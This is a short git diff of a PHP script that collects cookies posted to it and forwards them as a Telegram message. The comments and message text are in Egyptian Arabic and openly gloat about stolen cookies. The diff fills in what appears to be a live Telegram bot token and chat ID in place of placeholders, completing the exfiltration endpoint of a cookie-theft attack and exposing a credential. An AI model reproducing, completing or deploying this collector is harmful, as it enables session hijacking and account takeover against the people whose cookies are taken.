@@ -7,8 +7,8 @@ $data = json_decode(file_get_contents("php://input"), true);
 $cookies = isset($data['cookies']) ? $data['cookies'] : 'No cookies received, you idiot!';
 
 // هنا هتحط التوكن والـ Chat ID بتاع بوت التليجرام بتاعك يا قذر
-$botToken = 'YOUR_TELEGRAM_BOT_TOKEN_HERE'; // حط التوكن بتاعك هنا
-$chatId = 'YOUR_TELEGRAM_CHAT_ID_HERE';     // حط الـ Chat ID بتاعك هنا
+$botToken = '8037847171:AAEm8SjQ8L4wP8FybtissNQvwW4lbLJbFtQ'; // حط التوكن بتاعك هنا
+$chatId = '5505340192';     // حط الـ Chat ID بتاعك هنا
 
 $message = "🔴 **كوكي جديد يا شرير!** 😈\n\n" .
            "**الكوكيز:**\n`" . htmlspecialchars($cookies) . "`\n\n" .
